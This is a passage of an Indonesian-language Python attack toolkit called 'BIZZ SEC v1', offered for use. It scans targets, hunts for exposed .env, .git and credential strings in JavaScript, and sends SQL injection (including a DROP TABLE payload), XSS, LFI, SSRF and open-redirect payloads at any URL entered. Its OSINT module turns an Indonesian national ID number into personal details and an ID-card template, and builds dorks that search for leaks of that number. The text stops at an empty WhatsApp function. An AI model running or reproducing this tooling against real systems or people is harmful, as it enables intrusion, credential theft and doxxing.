#!/usr/bin/env python3
"""
BIZZ SEC v1 — multi-tool security framework.
Jalan di Termux tanpa root. Real work, no fake.
Upgrade final: OSINT NIK (struktur + template KTP lengkap) + WhatsApp OSINT.
"""

import base64
import binascii
import hashlib
import hmac
import json
import os
import random
import re
import socket
import string
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests
import urllib3
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


# ============================================================
# WARNA
# ============================================================
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT


BANNER = f"""{M}{BOLD}
  ██████╗ ██╗███████╗███████╗    ███████╗███████╗ ██████╗
  ██╔══██╗██║╚══███╔╝╚══███╔╝    ██╔════╝██╔════╝██╔════╝
  ██████╔╝██║  ███╔╝   ███╔╝     ███████╗█████╗  ██║
  ██╔══██╗██║ ███╔╝   ███╔╝      ╚════██║██╔══╝  ██║
  ██████╔╝██║███████╗███████╗    ███████║███████╗╚██████╗
  ╚═════╝ ╚═╝╚══════╝╚══════╝    ╚══════╝╚══════╝ ╚═════╝
{RESET}{C}{BOLD}
               >> BIZZ SEC v1 <<
          recon · web · crypto · osint · utils
{RESET}{Y}
                 by Bizz · 6767
{RESET}"""


MENU = f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                     BIZZ SEC v1                              ║
╠══════════════════════════════════════════════════════════════╣
║  {G}[1]{C} RECON       {G}[2]{C} WEB TEST      {G}[3]{C} CRYPTO          ║
║  {G}[4]{C} OSINT       {G}[5]{C} UTILITY       {G}[6]{C} HASH            ║
║  {G}[7]{C} ENCODE      {G}[8]{C} BRUTE         {G}[9]{C} SCAN            ║
║  {G}[10]{C} ACCOUNT BF                                           ║
║  {G}[0]{C} KELUAR                                              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""


UA_LIST = [
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
    "curl/8.0",
]


# ============================================================
# NIK DATA
# ============================================================
PROVINSI = {
    "11": "ACEH", "12": "SUMATERA UTARA", "13": "SUMATERA BARAT",
    "14": "RIAU", "15": "JAMBI", "16": "SUMATERA SELATAN",
    "17": "BENGKULU", "18": "LAMPUNG", "19": "KEPULAUAN BANGKA BELITUNG",
    "21": "KEPULAUAN RIAU", "31": "DKI JAKARTA", "32": "JAWA BARAT",
    "33": "JAWA TENGAH", "34": "DI YOGYAKARTA", "35": "JAWA TIMUR",
    "36": "BANTEN", "51": "BALI", "52": "NUSA TENGGARA BARAT",
    "53": "NUSA TENGGARA TIMUR", "61": "KALIMANTAN BARAT",
    "62": "KALIMANTAN TENGAH", "63": "KALIMANTAN SELATAN",
    "64": "KALIMANTAN TIMUR", "65": "KALIMANTAN UTARA",
    "71": "SULAWESI UTARA", "72": "SULAWESI TENGAH",
    "73": "SULAWESI SELATAN", "74": "SULAWESI TENGGARA",
    "75": "GORONTALO", "76": "SULAWESI BARAT", "81": "MALUKU",
    "82": "MALUKU UTARA", "91": "PAPUA", "92": "PAPUA BARAT",
    "93": "PAPUA SELATAN", "94": "PAPUA TENGAH", "95": "PAPUA PEGUNUNGAN",
    "96": "PAPUA BARAT DAYA",
}

# Prefix operator Indonesia
OPERATOR_PREFIX = {
    "0811": "Telkomsel (Halo)", "0812": "Telkomsel (SimPATI/Halo)",
    "0813": "Telkomsel (SimPATI/Halo)", "0821": "Telkomsel (SimPATI)",
    "0822": "Telkomsel (SimPATI)", "0823": "Telkomsel (AS)",
    "0851": "Telkomsel (AS)", "0852": "Telkomsel (AS)", "0853": "Telkomsel (AS)",
    "0814": "Indosat (IM3)", "0815": "Indosat (IM3/Mentari)",
    "0816": "Indosat (IM3/Mentari)", "0855": "Indosat (Matrix)",
    "0856": "Indosat (IM3)", "0857": "Indosat (IM3)", "0858": "Indosat (Mentari)",
    "0817": "XL", "0818": "XL", "0819": "XL", "0859": "XL",
    "0877": "XL", "0878": "XL",
    "0831": "Axis", "0832": "Axis", "0833": "Axis", "0838": "Axis",
    "0881": "Smartfren", "0882": "Smartfren", "0883": "Smartfren",
    "0884": "Smartfren", "0885": "Smartfren", "0886": "Smartfren",
    "0887": "Smartfren", "0888": "Smartfren", "0889": "Smartfren",
    "0895": "Tri (3)", "0896": "Tri (3)", "0897": "Tri (3)",
    "0898": "Tri (3)", "0899": "Tri (3)",
}




# Kode plat nomor Indonesia
PLATE_REGION = {
    "A": "Banten (Serang, Cilegon, Pandeglang, Lebak, Tangerang)",
    "B": "DKI Jakarta / Depok / Tangerang / Bekasi",
    "D": "Bandung / Cimahi / Bandung Barat",
    "E": "Cirebon / Indramayu / Majalengka / Kuningan",
    "F": "Bogor / Sukabumi / Cianjur",
    "T": "Purwakarta / Karawang / Subang",
    "Z": "Garut / Tasikmalaya / Ciamis / Sumedang / Banjar",
    "G": "Pekalongan / Tegal / Brebes / Batang / Pemalang",
    "H": "Semarang / Salatiga / Kendal / Demak",
    "K": "Pati / Kudus / Jepara / Rembang / Blora / Grobogan",
    "R": "Banyumas / Cilacap / Purbalingga / Banjarnegara",
    "AA": "Magelang / Purworejo / Kebumen / Temanggung / Wonosobo",
    "AB": "DI Yogyakarta / Bantul / Sleman / Kulon Progo / Gunungkidul",
    "AD": "Surakarta / Sukoharjo / Boyolali / Sragen / Karanganyar / Wonogiri / Klaten",
    "L": "Surabaya",
    "M": "Madura (Bangkalan / Sampang / Pamekasan / Sumenep)",
    "N": "Malang / Pasuruan / Probolinggo / Lumajang / Batu",
    "P": "Jember / Banyuwangi / Bondowoso / Situbondo",
    "S": "Bojonegoro / Mojokerto / Tuban / Lamongan / Jombang",
    "W": "Sidoarjo / Gresik",
    "AE": "Madiun / Ngawi / Magetan / Ponorogo / Pacitan",
    "AG": "Kediri / Blitar / Tulungagung / Nganjuk / Trenggalek",
    "DK": "Bali",
    "DR": "Lombok (Mataram / Lombok Barat / Tengah / Timur)",
    "EA": "Sumbawa / Dompu / Bima",
    "DH": "Kupang / Timor",
    "EB": "Flores / Manggarai / Ende / Sikka",
    "ED": "Sumba",
    "KB": "Kalimantan Barat",
    "DA": "Kalimantan Selatan",
    "KH": "Kalimantan Tengah",
    "KT": "Kalimantan Timur",
    "KU": "Kalimantan Utara",
    "DB": "Sulawesi Utara (Manado)",
    "DL": "Sitaro / Talaud",
    "DM": "Gorontalo",
    "DN": "Sulawesi Tengah",
    "DT": "Sulawesi Tenggara",
    "DD": "Sulawesi Selatan (Makassar)",
    "DP": "Sulawesi Barat",
    "DW": "Sulawesi Barat (Mamuju)",
    "DE": "Maluku",
    "DG": "Maluku Utara",
    "PA": "Papua",
    "PB": "Papua Barat",
    "BL": "Aceh",
    "BB": "Sumatera Utara (Tapanuli)",
    "BK": "Sumatera Utara (Medan)",
    "BA": "Sumatera Barat",
    "BM": "Riau",
    "BP": "Kepulauan Riau",
    "BG": "Sumatera Selatan",
    "BN": "Bangka Belitung",
    "BE": "Lampung",
    "BD": "Bengkulu",
    "BH": "Jambi",
}
# ============================================================
# HELPER
# ============================================================
def clear():
    os.system("clear" if os.name != "nt" else "cls")


def pause():
    input(f"\n{C}[?]{RESET} ENTER buat lanjut...")


def log(kind, msg):
    tag = {
        "info": f"{C}[*]{RESET}",
        "ok":   f"{G}[+]{RESET}",
        "warn": f"{Y}[!]{RESET}",
        "err":  f"{R}[-]{RESET}",
        "crit": f"{M}[X]{RESET}",
    }[kind]
    print(f"{tag} {msg}")


def prompt(msg, default=""):
    v = input(f"{C}[?]{RESET} {msg}: ").strip()
    return v if v else default


def load_list(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        return []


def save_out(name, content):
    os.makedirs("output", exist_ok=True)
    path = os.path.join("output", name)
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)
    return path


# ============================================================
# [1] RECON
# ============================================================
class Recon:
    def subdomain(self):
        print(f"\n{C}=== SUBDOMAIN ENUM ==={RESET}")
        domain = prompt("Domain (contoh: example.com)")
        if not domain:
            return
        subs = ["www","api","admin","dev","staging","test","mail","ftp","ssh",
                "vpn","panel","cp","cpanel","webmail","portal","app","beta",
                "demo","internal","intranet","cdn","static","assets","img",
                "ns1","ns2","blog","shop","store","news","support"]
        log("info", f"Cek {len(subs)} subdomain...")
        found = []

        def _check(s):
            full = f"{s}.{domain}"
            try:
                ip = socket.gethostbyname(full)
                return (full, ip)
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futs = [ex.submit(_check, s) for s in subs]
            for f in as_completed(futs):
                res = f.result()
                if res:
                    name, ip = res
                    log("ok", f"{name} -> {ip}")
                    found.append(f"{name} -> {ip}")

        if found:
            save_out(f"subdomain_{domain}.txt", "\n".join(found))
            log("ok", f"Saved: {len(found)} subdomain")

    def port_scan(self):
        print(f"\n{C}=== PORT SCAN ==={RESET}")
        host = prompt("Host / IP target")
        if not host:
            return
        ports = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                 110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
                 995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
                 5432:"Postgres",5900:"VNC",6379:"Redis",8080:"Alt HTTP",
                 8443:"Alt HTTPS",9200:"Elasticsearch",27017:"MongoDB"}
        log("info", f"Scan {len(ports)} port...")
        found = []

        def _check(p):
            try:
                s = socket.create_connection((host, p), timeout=3)
                s.close()
                return (p, ports[p])
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futs = [ex.submit(_check, p) for p in ports]
            for f in as_completed(futs):
                res = f.result()
                if res:
                    p, name = res
                    log("ok", f"Port {p} OPEN -> {name}")
                    found.append(f"{p}/tcp {name}")

        if found:
            save_out(f"portscan_{host}.txt", "\n".join(found))

    def whois(self):
        print(f"\n{C}=== WHOIS LOOKUP ==={RESET}")
        domain = prompt("Domain")
        if not domain:
            return
        try:
            r = requests.get(f"https://api.hackertarget.com/whois/?q={domain}",
                             timeout=15)
            print(r.text[:5000])
        except Exception as e:
            log("err", str(e))

    def dns_lookup(self):
        print(f"\n{C}=== DNS LOOKUP ==={RESET}")
        domain = prompt("Domain")
        if not domain:
            return
        try:
            r = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}",
                             timeout=15)
            print(r.text[:3000])
        except Exception as e:
            log("err", str(e))

    def ip_info(self):
        print(f"\n{C}=== IP INFO ==={RESET}")
        ip = prompt("IP / Domain")
        if not ip:
            return
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            data = r.json()
            for k, v in data.items():
                print(f"  {Y}{k:<12}{RESET}: {W}{v}{RESET}")
        except Exception as e:
            log("err", str(e))

    def tech_detect(self):
        print(f"\n{C}=== TECH DETECT ==={RESET}")
        url = prompt("URL target")
        if not url:
            return
        try:
            r = requests.get(url, timeout=10, verify=False,
                             headers={"User-Agent": random.choice(UA_LIST)})
            log("info", f"Status: HTTP {r.status_code}")
            for h in ["Server", "X-Powered-By", "X-AspNet-Version",
                      "X-Generator", "CF-RAY", "Via"]:
                if h in r.headers:
                    log("ok", f"{h}: {r.headers[h]}")
            body = r.text.lower()
            tech = []
            for kw, name in [("wp-content","WordPress"),("laravel","Laravel"),
                             ("_next","Next.js"),("react","React"),
                             ("vue","Vue"),("django","Django"),
                             ("rails","Rails"),("express","Express"),
                             ("cloudflare","Cloudflare"),("firebase","Firebase"),
                             ("pterodactyl","Pterodactyl"),("bootstrap","Bootstrap"),
                             ("jquery","jQuery")]:
                if kw in body:
                    tech.append(name)
            if tech:
                log("ok", f"Tech: {', '.join(sorted(set(tech)))}")
        except Exception as e:
            log("err", str(e))

    def endpoint_enum(self):
        print(f"\n{C}=== ENDPOINT ENUM ==={RESET}")
        url = prompt("Base URL")
        if not url:
            return
        paths = ["/api","/api/v1","/api/v2","/api/users","/api/admin",
                 "/api/config","/api/keys","/api/token","/api/me","/api/profile",
                 "/admin","/login","/dashboard","/.env","/.git/config",
                 "/config.json","/config.js","/robots.txt","/sitemap.xml",
                 "/swagger.json","/openapi.json","/graphql","/api-docs",
                 "/backup.zip","/db.sql","/phpinfo.php","/actuator","/health"]
        found = []

        def _check(p):
            try:
                r = requests.get(url.rstrip("/") + p, timeout=8, verify=False,
                                 allow_redirects=False,
                                 headers={"User-Agent": random.choice(UA_LIST)})
                return (p, r.status_code, len(r.text))
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futs = [ex.submit(_check, p) for p in paths]
            for f in as_completed(futs):
                res = f.result()
                if res:
                    p, code, size = res
                    if code in (200, 201, 401, 403):
                        color = G if code == 200 else Y
                        print(f"  {color}[{code}]{RESET} {p} ({size}B)")
                        found.append(f"{code} {p} ({size}B)")

        if found:
            save_out(f"endpoints_{urllib.parse.urlparse(url).netloc}.txt",
                     "\n".join(found))

    def js_mining(self):
        print(f"\n{C}=== JS MINING ==={RESET}")
        url = prompt("URL target")
        if not url:
            return
        try:
            r = requests.get(url, timeout=10, verify=False,
                             headers={"User-Agent": random.choice(UA_LIST)})
            js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
            js_urls = [urllib.parse.urljoin(url, u) for u in js_urls][:15]
            log("info", f"JS files: {len(js_urls)}")
            cred_re = re.compile(
                r'(api[_-]?key|apikey|secret|token|bearer|auth|password)'
                r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', re.I)
            found = []
            for js in js_urls:
                try:
                    jr = requests.get(js, timeout=10, verify=False)
                    if jr.status_code != 200:
                        continue
                    for m in cred_re.finditer(jr.text):
                        k, v = m.group(1), m.group(2)
                        log("crit", f"{k}={v[:60]}")
                        found.append(f"{js} :: {k}={v}")
                except Exception:
                    pass
            if found:
                save_out("js_creds.txt", "\n".join(found))
        except Exception as e:
            log("err", str(e))

    def header_analysis(self):
        print(f"\n{C}=== SECURITY HEADERS ==={RESET}")
        url = prompt("URL target")
        if not url:
            return
        try:
            r = requests.get(url, timeout=10, verify=False)
            sec = ["Strict-Transport-Security","Content-Security-Policy",
                   "X-Frame-Options","X-Content-Type-Options",
                   "Referrer-Policy","Permissions-Policy"]
            for h in sec:
                if h in r.headers:
                    log("ok", f"[+] {h}: {r.headers[h][:60]}")
                else:
                    log("warn", f"[-] {h} MISSING")
        except Exception as e:
            log("err", str(e))

    def robots(self):
        print(f"\n{C}=== ROBOTS.TXT ==={RESET}")
        url = prompt("Base URL")
        if not url:
            return
        try:
            r = requests.get(url.rstrip("/") + "/robots.txt", timeout=10, verify=False)
            if r.status_code == 200:
                print(r.text[:2000])
                save_out("robots.txt", r.text)
                log("ok", "Saved ke output/robots.txt")
            else:
                log("warn", f"HTTP {r.status_code}")
        except Exception as e:
            log("err", str(e))

    def run(self):
        print(f"""
{C}[ RECON ]{RESET}
  {G}[1]{RESET}  Subdomain Enum
  {G}[2]{RESET}  Port Scan
  {G}[3]{RESET}  Whois
  {G}[4]{RESET}  DNS Lookup
  {G}[5]{RESET}  IP Info
  {G}[6]{RESET}  Tech Detect
  {G}[7]{RESET}  Endpoint Enum
  {G}[8]{RESET}  JS Mining
  {G}[9]{RESET}  Security Headers
  {G}[10]{RESET} Robots.txt
  {G}[0]{RESET}  Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.subdomain, "2": self.port_scan, "3": self.whois,
              "4": self.dns_lookup, "5": self.ip_info, "6": self.tech_detect,
              "7": self.endpoint_enum, "8": self.js_mining,
              "9": self.header_analysis, "10": self.robots}
        if p in fn:
            fn[p]()


# ============================================================
# [2] WEB TEST
# ============================================================
class WebTest:
    def sqli(self):
        print(f"\n{C}=== SQL INJECTION TEST ==={RESET}")
        url = prompt("URL dengan parameter (contoh: http://site.com/page?id=1)")
        if not url:
            return
        payloads = ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                    "1' AND SLEEP(3)--", "1 UNION SELECT NULL--",
                    "%27", "1;DROP TABLE users--"]
        for pl in payloads:
            test = url.replace("=1", f"={urllib.parse.quote(pl)}") if "=1" in url else url + urllib.parse.quote(pl)
            try:
                start = time.time()
                r = requests.get(test, timeout=15, verify=False)
                el = time.time() - start
                if r.status_code == 500:
                    log("crit", f"500 di {pl[:30]}")
                if el > 2.5:
                    log("crit", f"Time-based {el:.1f}s di {pl[:30]}")
                if re.search(r"(sql syntax|mysql_|ORA-|PostgreSQL|SQLite)", r.text, re.I):
                    log("crit", f"SQL error di {pl[:30]}")
            except Exception:
                pass

    def xss(self):
        print(f"\n{C}=== XSS TEST ==={RESET}")
        url = prompt("URL dengan parameter")
        if not url:
            return
        payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>', 'javascript:alert(1)',
                    "'-alert(1)-'"]
        for pl in payloads:
            test = url.replace("=1", f"={urllib.parse.quote(pl)}") if "=1" in url else url + urllib.parse.quote(pl)
            try:
                r = requests.get(test, timeout=15, verify=False)
                if pl in r.text or pl.replace('"', '&quot;') in r.text:
                    log("crit", f"Reflected: {pl[:40]}")
            except Exception:
                pass

    def lfi(self):
        print(f"\n{C}=== LFI TEST ==={RESET}")
        url = prompt("URL dengan parameter file/page")
        if not url:
            return
        payloads = ["../../etc/passwd", "..%2f..%2fetc%2fpasswd",
                    "....//....//etc/passwd", "/etc/passwd",
                    "C:\\Windows\\win.ini", "..%5c..%5cwindows%5cwin.ini"]
        for pl in payloads:
            test = url.replace("=1", f"={urllib.parse.quote(pl)}") if "=1" in url else url + urllib.parse.quote(pl)
            try:
                r = requests.get(test, timeout=15, verify=False)
                if "root:x:" in r.text:
                    log("crit", f"Linux LFI: {pl}")
                if "[extensions]" in r.text or "[fonts]" in r.text:
                    log("crit", f"Windows LFI: {pl}")
            except Exception:
                pass

    def ssrf(self):
        print(f"\n{C}=== SSRF TEST ==={RESET}")
        url = prompt("URL dengan parameter URL")
        if not url:
            return
        payloads = ["http://127.0.0.1", "http://localhost",
                    "http://169.254.169.254/latest/meta-data/",
                    "file:///etc/passwd", "http://[::1]"]
        for pl in payloads:
            test = url.replace("=1", f"={urllib.parse.quote(pl)}") if "=1" in url else url + urllib.parse.quote(pl)
            try:
                r = requests.get(test, timeout=15, verify=False)
                if r.status_code == 200:
                    log("warn", f"SSRF candidate: {pl}")
            except Exception:
                pass

    def cors(self):
        print(f"\n{C}=== CORS MISCONFIG ==={RESET}")
        url = prompt("URL target")
        if not url:
            return
        try:
            r = requests.get(url, timeout=15, verify=False,
                             headers={"Origin": "https://evil.com"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                log("warn", "CORS wildcard")
            elif "evil.com" in acao:
                log("crit", f"CORS reflects: {acao}")
            if acao and acac.lower() == "true":
                log("crit", "CORS + credentials")
        except Exception as e:
            log("err", str(e))

    def header_bypass(self):
        print(f"\n{C}=== HEADER BYPASS TEST ==={RESET}")
        url = prompt("URL target")
        if not url:
            return
        try:
            base = requests.get(url, timeout=15, verify=False, allow_redirects=False)
            print(f"  Baseline: HTTP {base.status_code}")
        except Exception as e:
            log("err", str(e))
            return
        headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": "/"},
            {"X-Rewrite-URL": "/"},
        ]
        for h in headers_list:
            try:
                r = requests.get(url, timeout=15, verify=False,
                                 headers=h, allow_redirects=False)
                if r.status_code != base.status_code:
                    log("crit", f"Bypass: {list(h.keys())[0]} -> {r.status_code}")
            except Exception:
                pass

    def graphql(self):
        print(f"\n{C}=== GRAPHQL INTROSPECTION ==={RESET}")
        url = prompt("URL GraphQL")
        if not url:
            return
        try:
            r = requests.post(url, json={"query": "{__schema{types{name}}}"},
                              timeout=15, verify=False)
            if "__schema" in r.text:
                log("crit", "Introspection AKTIF")
                print(r.text[:800])
                save_out("graphql_schema.json", r.text)
            else:
                log("info", "Introspection off / endpoint beda")
        except Exception as e:
            log("err", str(e))

    def open_redirect(self):
        print(f"\n{C}=== OPEN REDIRECT TEST ==={RESET}")
        url = prompt("URL dengan parameter redirect")
        if not url:
            return
        payloads = ["https://evil.com", "//evil.com", "/\\evil.com",
                    "https:evil.com", "https://evil.com/%2f.."]
        for pl in payloads:
            test = url.replace("=1", f"={urllib.parse.quote(pl)}") if "=1" in url else url + urllib.parse.quote(pl)
            try:
                r = requests.get(test, timeout=15, verify=False, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "evil.com" in loc:
                    log("crit", f"Open redirect: {pl}")
            except Exception:
                pass

    def run(self):
        print(f"""
{C}[ WEB TEST MENU ]{RESET}
  {G}[1]{RESET} SQL Injection
  {G}[2]{RESET} XSS
  {G}[3]{RESET} LFI
  {G}[4]{RESET} SSRF
  {G}[5]{RESET} CORS Misconfig
  {G}[6]{RESET} Header Bypass
  {G}[7]{RESET} GraphQL Introspection
  {G}[8]{RESET} Open Redirect
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.sqli, "2": self.xss, "3": self.lfi, "4": self.ssrf,
              "5": self.cors, "6": self.header_bypass, "7": self.graphql,
              "8": self.open_redirect}
        if p in fn:
            fn[p]()


# ============================================================
# [3] CRYPTO
# ============================================================
class Crypto:
    def caesar(self):
        print(f"\n{C}=== CAESAR BRUTE ==={RESET}")
        text = prompt("Text")
        if not text:
            return
        for s in range(1, 26):
            out = ""
            for ch in text:
                if ch.isalpha():
                    base = ord('A') if ch.isupper() else ord('a')
                    out += chr((ord(ch) - base + s) % 26 + base)
                else:
                    out += ch
            print(f"  {Y}Shift {s:>2}{RESET}: {out}")

    def xor_brute(self):
        print(f"\n{C}=== XOR BRUTE ==={RESET}")
        h = prompt("Hex string")
        if not h:
            return
        try:
            data = bytes.fromhex(h)
        except Exception:
            log("err", "Hex nggak valid")
            return
        for key in range(1, 256):
            out = bytes(b ^ key for b in data)
            if all(32 <= c < 127 or c in (9, 10, 13) for c in out):
                print(f"  {Y}Key {key:>3}{RESET}: {out.decode('ascii', errors='ignore')}")

    def vigenere(self):
        print(f"\n{C}=== VIGENERE DECODE ==={RESET}")
        text = prompt("Text")
        key = prompt("Key")
        if not text or not key:
            return
        result = []
        ki = 0
        for ch in text:
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                k = ord(key[ki % len(key)].lower()) - ord('a')
                result.append(chr((ord(ch) - base - k) % 26 + base))
                ki += 1
            else:
                result.append(ch)
        print(f"  Decoded: {G}{''.join(result)}{RESET}")

    def rot13(self):
        print(f"\n{C}=== ROT13 ==={RESET}")
        text = prompt("Text")
        import codecs
        print(f"  {G}{codecs.encode(text, 'rot_13')}{RESET}")

    def run(self):
        print(f"""
{C}[ CRYPTO MENU ]{RESET}
  {G}[1]{RESET} Caesar Brute (26 shift)
  {G}[2]{RESET} XOR Brute (1-byte)
  {G}[3]{RESET} Vigenere Decode
  {G}[4]{RESET} ROT13
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.caesar, "2": self.xor_brute,
              "3": self.vigenere, "4": self.rot13}
        if p in fn:
            fn[p]()


# ============================================================
# [4] OSINT
# ============================================================
class OSINT:
    def username_search(self):
        print(f"\n{C}=== USERNAME SEARCH ==={RESET}")
        user = prompt("Username")
        if not user:
            return
        sites = [
            f"https://github.com/{user}",
            f"https://twitter.com/{user}",
            f"https://instagram.com/{user}",
            f"https://tiktok.com/@{user}",
            f"https://reddit.com/user/{user}",
            f"https://youtube.com/@{user}",
            f"https://t.me/{user}",
            f"https://facebook.com/{user}",
            f"https://pinterest.com/{user}",
            f"https://twitch.tv/{user}",
        ]
        for url in sites:
            try:
                r = requests.head(url, timeout=10, allow_redirects=True,
                                  headers={"User-Agent": random.choice(UA_LIST)})
                if r.status_code == 200:
                    log("ok", f"[200] {url}")
                else:
                    log("warn", f"[{r.status_code}] {url}")
            except Exception:
                pass

    def ip_geo(self):
        print(f"\n{C}=== IP GEOLOCATION ==={RESET}")
        ip = prompt("IP")
        if not ip:
            return
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            for k, v in r.json().items():
                print(f"  {Y}{k:<14}{RESET}: {W}{v}{RESET}")
        except Exception as e:
            log("err", str(e))

    def ip_public(self):
        print(f"\n{C}=== YOUR PUBLIC IP ==={RESET}")
        try:
            r = requests.get("https://api.ipify.org", timeout=10)
            print(f"  {G}IP kamu: {W}{r.text}{RESET}")
        except Exception as e:
            log("err", str(e))

    def email_check(self):
        print(f"\n{C}=== EMAIL MX CHECK ==={RESET}")
        email = prompt("Email")
        if not email:
            return
        domain = email.split("@")[-1]
        try:
            import subprocess
            out = subprocess.run(["nslookup", "-type=mx", domain],
                                 capture_output=True, text=True, timeout=10)
            print(out.stdout[:500])
        except Exception as e:
            log("err", str(e))

    def nik_lookup(self):
        print(f"\n{C}=== NIK OSINT (KTP PARSE) ==={RESET}")
        nik = prompt("NIK 16 digit").strip()
        if not nik or not nik.isdigit() or len(nik) != 16:
            log("err", "NIK harus 16 digit angka")
            return

        # Parse struktur
        prov_code = nik[0:2]
        kab_code = nik[0:4]
        kec_code = nik[0:6]
        tgl = int(nik[6:8])
        bln = int(nik[8:10])
        thn = int(nik[10:12])
        uniq = nik[12:16]

        gender = "LAKI-LAKI"
        if tgl > 40:
            gender = "PEREMPUAN"
            tgl -= 40
        tahun = 1900 + thn if thn > 30 else 2000 + thn

        try:
            lahir = datetime(tahun, bln, tgl)
            umur = (datetime.now() - lahir).days // 365
            lahir_str = lahir.strftime("%d-%m-%Y")
            lahir_iso = lahir.strftime("%Y-%m-%d")
        except Exception:
            lahir_str = f"{tgl:02d}-{bln:02d}-{tahun}"
            lahir_iso = f"{tahun}-{bln:02d}-{tgl:02d}"
            umur = "?"

        prov_name = PROVINSI.get(prov_code, "UNKNOWN")

        # Output struktur
        log("ok", f"NIK            : {nik}")
        log("ok", f"Provinsi       : {prov_code} - {prov_name}")
        log("ok", f"Kab/Kota       : {kab_code}")
        log("ok", f"Kecamatan      : {kec_code}")
        log("ok", f"TTL            : {lahir_str}")
        log("ok", f"Jenis Kelamin  : {gender}")
        log("ok", f"Umur approx    : {umur} tahun")
        log("ok", f"Uniq code      : {uniq}")

        # API nusakit
        api_data = None
        try:
            r = requests.get(
                f"https://nusakit.my.id/v1/nik/validate?nik={nik}",
                timeout=12,
                headers={"User-Agent": random.choice(UA_LIST)}
            )
            if r.status_code == 200:
                api_data = r.json()
                log("info", "--- Hasil API nusakit ---")
                print(json.dumps(api_data, indent=2, ensure_ascii=False)[:1200])
        except Exception as e:
            log("warn", f"API nusakit gagal: {e}")

        # Template KTP lengkap (format yang diminta user)
        # Field nama/agama/alamat/pekerjaan TIDAK ada di NIK → diisi placeholder
        # User bisa isi manual atau dari sumber lain
        print(f"\n{C}{'='*50}")
        print(f"  TEMPLATE DATA KTP (format resmi)")
        print(f"{'='*50}{RESET}")
        print(f"""
PROVINSI {prov_name}
KAB/KOTA {kab_code}

NIK                 : {nik}
Nama                : [ISI MANUAL / DARI SUMBER LAIN]
Tempat/Tgl Lahir    : [TEMPAT], {lahir_str}
Jenis kelamin       : {gender}     Gol. Darah : -
Alamat              : [ISI MANUAL]
RT/RW               : -
Kel/Desa            : -
Kecamatan           : {kec_code}
Agama               : [ISI MANUAL]
Status Perkawinan   : -
Pekerjaan           : -
Kewarganegaraan     : WNI
Berlaku Hingga      : SEUMUR HIDUP
""")
        log("warn", "Nama, Agama, Alamat, RT/RW, Kel/Desa, Status, Pekerjaan")
        log("warn", "TIDAK tersimpan di dalam NIK. Hanya bisa didapat dari")
        log("warn", "database Dukcapil resmi atau sumber lain.")

        # Dork
        log("info", "Dork search links (buka manual):")
        dorks = [
            f'"{nik}"',
            f'"{nik}" (ktp OR dukcapil OR penduduk)',
            f'"{nik}" site:pastebin.com OR site:ghostbin.com',
        ]
        for d in dorks:
            q = urllib.parse.quote(d)
            print(f"  https://www.google.com/search?q={q}")

        # Simpan report
        out = f"""NIK OSINT Report - BIZZ SEC
========================================
NIK            : {nik}
Provinsi       : {prov_code} - {prov_name}
Kab/Kota       : {kab_code}
Kecamatan      : {kec_code}
TTL            : {lahir_str}
Gender         : {gender}
Umur           : {umur}
Uniq           : {uniq}

--- TEMPLATE KTP ---
PROVINSI {prov_name}
KAB/KOTA {kab_code}

NIK                 : {nik}
Nama                : [ISI MANUAL]
Tempat/Tgl Lahir    : [TEMPAT], {lahir_str}
Jenis kelamin       : {gender}     Gol. Darah : -
Alamat              : [ISI MANUAL]
RT/RW               : -
Kel/Desa            : -
Kecamatan           : {kec_code}
Agama               : [ISI MANUAL]
Status Perkawinan   : -
Pekerjaan           : -
Kewarganegaraan     : WNI
Berlaku Hingga      : SEUMUR HIDUP

Catatan: Nama, Agama, Alamat lengkap, RT/RW, Kel/Desa,
Status Perkawinan, Pekerjaan TIDAK ada di struktur NIK.
Data tersebut hanya tersedia di database resmi Dukcapil.
"""
        path = save_out(f"nik_{nik}.txt", out)
        log("ok", f"Saved: {path}")

    def whatsapp_osint(self):
